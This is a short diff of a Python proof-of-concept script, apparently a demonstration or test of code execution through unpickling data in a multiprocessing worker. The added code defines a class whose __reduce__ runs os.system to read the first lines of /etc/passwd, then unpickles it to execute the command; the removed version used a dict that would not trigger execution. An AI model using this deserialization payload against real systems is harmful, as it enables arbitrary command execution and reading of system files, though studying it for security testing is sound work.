@@ -2,12 +2,13 @@ import multiprocessing
 import pickle
 import os
 
-# Create a malicious pickle object that will execute arbitrary code
-malicious_pickle = pickle.dumps({'__reduce__': (os.system, ('echo "Vulnerable!" > /tmp/vulnerable',))})
+class Malicious(object):
+    def __reduce__(self):
+        return (os.system, ('head -n 30 /etc/passwd',))
 
-# Create a multiprocessing pool with the forkserver start method
-with multiprocessing.Pool(processes=1, start_method='forkserver') as pool:
-    # Use the pool to deserialize the malicious pickle object
-    pool.apply_async(pickle.loads, (malicious_pickle,))
-
-print("Vulnerable code executed!")
+if __name__ == "__main__":
+    malicious_pickle = pickle.dumps(Malicious())
+    with multiprocessing.Pool(processes=1) as pool:
+        # Use synchronous apply to simplify debugging
+        pool.apply(pickle.loads, (malicious_pickle,))
+    print("Vulnerable code executed!")
